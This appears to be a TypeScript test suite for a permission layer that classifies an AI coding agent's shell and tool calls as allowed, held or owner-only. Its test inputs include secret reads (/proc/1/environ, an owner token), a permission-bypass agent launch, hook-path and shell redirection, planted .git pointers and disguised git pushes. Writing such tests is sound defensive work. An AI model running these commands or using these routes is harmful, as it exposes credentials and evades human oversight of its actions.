      `git init ${DATA}/internal`,
      `git -C ${DATA}/worker-hooks init`,
      `git clone https://example.com/r.git ${DATA}/internal/persona2`,
      `git clone https://example.com/r.git ${DATA}/persona-attachments/x`,
    ]) {
      expect(bash(command).action).toBe("hold");
    }
  });

  test("a root at or above the data dir doesn't make Standup's own data a checkout", () => {
    const wide = { ...config, worktreeRoots: [DATA, `${HOME}/.local`] };
    const files: Record<string, string> = { ...FILES, [`${DATA}/internal/.git`]: "gitdir: /x/.git/worktrees/i\n" };
    const p = probes({ readFile: (f) => (f in files ? { ok: true, text: files[f]! } : { ok: false, reason: "missing" }), exists: (f) => f in files || DIRS.has(f) });
    for (const file of [`${DATA}/internal/persona/notes.md`, `${DATA}/restart/state.json`, `${DATA}/worker-hooks/post-checkout`]) {
      expect(classifyToolCall({ toolName: "Write", toolInput: { file_path: file, content: "x" }, cwd: ROOT }, wide, p).action).toBe("hold");
    }
    const roots = floorWorktreeRoots(DATA, {}, [DATA, `${HOME}/.local`, `${HOME}/.local/share`], HOME);
    expect(roots).toContain(`${DATA}/worktrees`);
    for (const r of [DATA, `${HOME}/.local`, `${HOME}/.local/share`]) expect(roots).not.toContain(r);
  });

  test("a root spelled through the home dir's symlink target is dropped too", () => {
    const base = realpathSync(mkdtempSync(join(tmpdir(), "floor-roots-")));
    try {
      const real = join(base, "local-home");
      mkdirSync(join(real, ".local", "share", "standup"), { recursive: true });
      symlinkSync(real, join(base, "home"));
      const home = join(base, "home");
      const roots = floorWorktreeRoots(join(home, ".local/share/standup"), { STANDUP_WORKTREE_ROOT: real }, [join(real, ".local/share")], home);
      expect(roots).not.toContain(real);
      expect(roots).not.toContain(join(real, ".local/share"));
      expect(roots).toContain(join(home, ".local/share/standup/worktrees"));
    } finally {
      rmSync(base, { recursive: true, force: true });
    }
  });

  test("a main checkout under a broad root isn't a Standup worktree; its existing files stay held", () => {
    const broad = { ...config, worktreeRoots: [`${HOME}/code`] };
    expect(classifyToolCall({ toolName: "Write", toolInput: { file_path: `${HOME}/code/other/pkgs/a.ts`, content: "x" }, cwd: ROOT }, broad, probes()).action).toBe("hold");
  });

  test("a .git pointer planted inside a main checkout doesn't make its files a worktree", () => {
    const broad = { ...config, worktreeRoots: [`${HOME}/code`] };
    for (const pointer of ["gitdir: /tmp/x\n", "gitdir: /srv/standup/.git/worktrees/evil\n"]) {
      const files: Record<string, string> = { ...FILES, [`${HOME}/code/other/pkgs/.git`]: pointer };
      const p = probes({ readFile: (f) => (f in files ? { ok: true, text: files[f]! } : { ok: false, reason: "missing" }), exists: (f) => f in files || DIRS.has(f) });
      expect(classifyToolCall({ toolName: "Write", toolInput: { file_path: `${HOME}/code/other/pkgs/a.ts`, content: "x" }, cwd: ROOT }, broad, p).action).toBe("hold");
    }
    const bogus: Record<string, string> = { ...FILES, [`${SIBLING}/.git`]: "gitdir: /tmp/x\n" };
    const p = probes({ readFile: (f) => (f in bogus ? { ok: true, text: bogus[f]! } : { ok: false, reason: "missing" }) });
    expect(classifyToolCall({ toolName: "Write", toolInput: { file_path: `${SIBLING}/packages/store/src/queries/asks.ts`, content: "x" }, cwd: ROOT }, config, p).action).toBe("hold");
  });

  test("hook managers, editor tasks and steering files in a sibling stay held", () => {
    for (const file of [".pre-commit-config.yaml", "lefthook.yml", ".vscode/tasks.json", ".gitattributes", "CLAUDE.md", "CLAUDE.local.md", "packages/x/AGENTS.md"]) {
      expect(tool("Write", { file_path: `${SIBLING}/${file}`, content: "x\n" }).action).toBe("hold");
    }
  });

  test("a sibling worktree's source edit is plain beside a DB or install neighbor", () => {
    expect(tool("Edit", { file_path: `${SIBLING}/packages/store/src/queries/asks.ts`, old_string: "export {};", new_string: "export const y = 2;" })).toEqual({ action: "allow" });
    expectOwner(tool("Write", { file_path: `${DATA}/standup.db-wal`, content: "" }), "floor-tamper");
  });

  test("a file under a worktree root but outside any checkout is not a source edit", () => {
    expect(tool("Write", { file_path: `${DATA}/worktrees/notes.txt`, content: "y" }).action).toBe("hold");
  });
});

describe("agent coordination tools", () => {
  test("SubagentHandback returns a subagent's text to its parent and runs, like SendMessage", () => {
    expect(tool("SubagentHandback", { result: "done: git push is the next step" })).toEqual({ action: "allow" });
    expect(tool("SendMessage", { to: "worker", message: "x" })).toEqual({ action: "allow" });
  });
});

describe("AWS changes by account", () => {
  const account = (id: string | null) => ({ awsAccount: () => id });

  test("a mutation in a listed non-prod account is Persona's", () => {
    expectPersona(bash("aws s3 rm s3://bucket/key", account(NONPROD)), "nonprod-aws");
    expectPersona(bash(`corp-creds credentials refresh --account ${NONPROD} --role Admin && aws lambda delete-function --function-name f`), "nonprod-aws");
  });

  test("a mutation in an unlisted account stays owner-only", () => {
    expectOwner(bash("aws s3 rm s3://bucket/key", account(PROD)), "aws");
    expectOwner(bash(`corp-creds credentials refresh --account ${PROD} --role Admin`), "aws");
  });

  test("a mutation in an account the floor can't attribute stays owner-only", () => {
    expectOwner(bash("aws s3 rm s3://bucket/key", account(null)), "aws");
  });
});

describe("other holds Persona decides", () => {
  test("git and tool config and nested agents are allowed; Persona's when they name a denylist target or read other settings", () => {
    expect(bash("git config core.hooksPath /tmp/hooks")).toEqual({ action: "allow" });
    expect(bash("npm config set script-shell ./x.sh")).toEqual({ action: "allow" });
    expect(bash("claude -p 'summarize the diff'")).toEqual({ action: "allow" });
    expectPersona(bash("git config alias.ship '!git push origin main'"), "unseen-code");
    expectPersona(bash("claude -p 'git push origin main'"), "unseen-code");
    expectPersona(bash("cd /tmp && claude -p 'summarize the diff'"), "unseen-code");
  });

  test("an agent started with permissions bypassed stays owner-only", () => {
    expectOwner(bash("claude -p --dangerously-skip-permissions 'do it'"), "floor-tamper");
  });

  test("diff over process substitutions classifies the inner commands", () => {
    expect(bash("diff <(sort a.txt) <(sort b.txt)", { realpath: (p) => (p.startsWith("/dev/fd/") ? `/proc/4242/fd/${p.slice(8)}` : p in FILES || DIRS.has(p) ? p : null) })).toEqual({ action: "allow" });
    expectOwner(bash("diff <(git push origin HEAD:main) b.txt"), "outward");
  });

  test("a bare /dev/fd path is still read as before", () => {
    expectOwner(bash("cat /proc/4242/fd/3"), "floor-tamper");
    expectOwner(bash("cat /dev/fd/3", { realpath: (p) => (p === "/dev/fd/3" ? "/proc/4242/fd/3" : p in FILES || DIRS.has(p) ? p : null) }), "floor-tamper");
  });

  test("owner secrets and another process's memory stay owner-only", () => {
    expectOwner(tool("Read", { file_path: `${DATA}/secrets/owner.token` }), "floor-tamper");
    expectOwner(bash("cat /proc/1/environ"), "floor-tamper");
  });
});

describe("syntax checks and read-only sed", () => {
  test("`bash -n` checks syntax without running the script", () => {
    expect(bash("bash -n check.sh")).toEqual({ action: "allow" });
    expect(bash("sh -n -c 'git push origin HEAD:main'")).toEqual({ action: "allow" });
  });

  test("running the same script is still classified by its contents", () => {
    expectOwner(bash("bash check.sh"), "outward");
    expectOwner(bash("bash -i -n check.sh"), "outward");
  });

  test("`sed -n` printing a computed line range reads", () => {
    expect(bash('n=$(grep -n hook a.txt | cut -d: -f1); sed -n "$n,$((n+25))p" a.txt')).toEqual({ action: "allow" });
    expect(bash('sed -n "$(grep -n hook a.txt | cut -d: -f1),+12p" a.txt')).toEqual({ action: "allow" });
  });

  test("a computed sed script that may write or run stays held", () => {
    expect(bash('sed -i -n "$n,$((n+25))p" a.txt').action).toBe("hold");
    expect(bash('sed "$n,$((n+25))p" a.txt').action).toBe("hold");
    expect(bash('sed -n "$n,$((n+25))w /tmp/x" a.txt').action).toBe("hold");
    expect(bash('sed -n "${n}e" a.txt').action).toBe("hold");
  });
});

describe("read-only MCP tools of the owner's doc services", () => {
  test("read, get, search and list tools run", () => {
    for (const name of [
      "mcp__corp-docs-mcp__read_document",
      "mcp__corp-docs-mcp__list_documents",
      "mcp__corp-wiki-mcp__WikiRead",
      "mcp__corp-mcp__SearchDocs",
      "mcp__corp-metrics-mcp__GetMetric",
      "mcp__corp-metrics-mcp__ListMetrics",
    ]) {
      expect(tool(name, { id: "doc-1" })).toEqual({ action: "allow" });
    }
  });

  test("write, share, comment and export tools stay outward", () => {
    for (const name of [
      "mcp__corp-wiki-mcp__edit_blocks",
      "mcp__corp-wiki-mcp__set_permissions",
      "mcp__corp-wiki-mcp__add_comment",
      "mcp__corp-wiki-mcp__WikiWrite",
      "mcp__corp-wiki-mcp__WikiComment",
      "mcp__corp-metrics-mcp__ExportMetrics",
    ]) {
      expectOwner(tool(name, { id: "doc-1" }), "outward");
    }
  });
});
